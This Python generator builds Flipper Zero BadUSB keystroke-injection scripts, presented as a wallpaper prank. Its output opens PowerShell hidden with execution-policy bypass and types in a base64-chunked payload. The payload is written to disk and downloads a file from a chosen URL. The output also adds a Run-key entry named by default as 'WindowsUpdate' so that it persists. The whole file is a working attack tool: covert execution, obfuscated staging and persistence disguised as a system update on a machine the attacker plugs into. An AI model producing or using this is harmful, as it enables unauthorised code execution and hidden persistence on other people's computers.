#!/usr/bin/env python3
"""
gen_prank_startup.py — generate a Flipper BadUSB chunk+run script
that embeds a wallpaper-prank PS1 and adds startup persistence.

Usage:
  ./gen_prank_startup.py --url https://example.com/image.jpg
  ./gen_prank_startup.py --url https://i.imgur.com/abc.png --name MicrosoftUpdate --out prank.txt
"""

import argparse
import base64
import sys

TEMPLATE_PS1 = """\
$f='{img_dest}'
(New-Object Net.WebClient).DownloadFile('{url}',$f)
$q=[char]34
Add-Type -MemberDefinition ('[DllImport('+$q+'user32.dll'+$q+')]public static extern int SystemParametersInfo(int a,int b,string c,int d);') -Name W -Namespace N
Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name WallpaperStyle -Value 2
Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name TileWallpaper -Value 0
[N.W]::SystemParametersInfo(20,0,$f,3)
"""

def generate(url, img_dest, ps1_dest, persist_name, chunk_size, delay):
    ps1 = TEMPLATE_PS1.format(url=url, img_dest=img_dest)
    b64 = base64.b64encode(ps1.encode("utf-8")).decode()

    lines = [
        "REM Prank wallpaper — chunk+run with startup persistence",
        f"REM url: {url}",
        f"REM persist key: {persist_name} | ps1: {ps1_dest}",
        f"DELAY {delay}",
        "GUI r",
        "DELAY 800",
        "STRING powershell -ep bypass -w hidden",
        "ENTER",
        "DELAY 1000",
        'STRING $d = ""',
        "ENTER",
    ]

    for i in range(0, len(b64), chunk_size):
        lines.append(f'STRING $d += "{b64[i:i+chunk_size]}"')
        lines.append("ENTER")

    ps1_dest_escaped = ps1_dest.replace("\\", "\\\\")
    lines.append(
        f"STRING $b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d)); "
        f"$f = '{ps1_dest}'; "
        f"[IO.File]::WriteAllText($f, $b); "
        f"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
        f"-Name '{persist_name}' -Value ('powershell -ep bypass -w hidden -f ' + $f); & $f"
    )
    lines.append("ENTER")

    return "\n".join(lines) + "\n"


def main():
    p = argparse.ArgumentParser(description="Generate Flipper BadUSB prank wallpaper script")
    p.add_argument("--url", "-u", required=True, help="Image URL to download as wallpaper")
    p.add_argument("--img-dest", default=r"C:\Users\Public\p.jpg",
                   help="Where to save the image on target (default: C:\\Users\\Public\\p.jpg)")
    p.add_argument("--ps1-dest", default=r"C:\Users\Public\wp.ps1",
                   help="Where to write the PS1 on target (default: C:\\Users\\Public\\wp.ps1)")
    p.add_argument("--name", "-n", default="WindowsUpdate",
                   help="Registry run key name (default: WindowsUpdate)")
    p.add_argument("--chunk-size", "-c", type=int, default=200,
                   help="Base64 chars per Flipper STRING line (default: 200)")
    p.add_argument("--delay", "-d", type=int, default=2000,
                   help="Initial delay in ms (default: 2000)")
    p.add_argument("--out", "-o", default=None,
                   help="Output file (default: stdout)")
    args = p.parse_args()

    script = generate(
        url=args.url,
        img_dest=args.img_dest,
        ps1_dest=args.ps1_dest,
        persist_name=args.name,
        chunk_size=args.chunk_size,
        delay=args.delay,
    )

    if args.out:
        with open(args.out, "w") as f:
            f.write(script)
        chunks = sum(1 for l in script.splitlines() if l.startswith("STRING $d +="))
        print(f"Written to {args.out} ({chunks} chunks)", file=sys.stderr)
    else:
        print(script, end="")


if __name__ == "__main__":
    main()
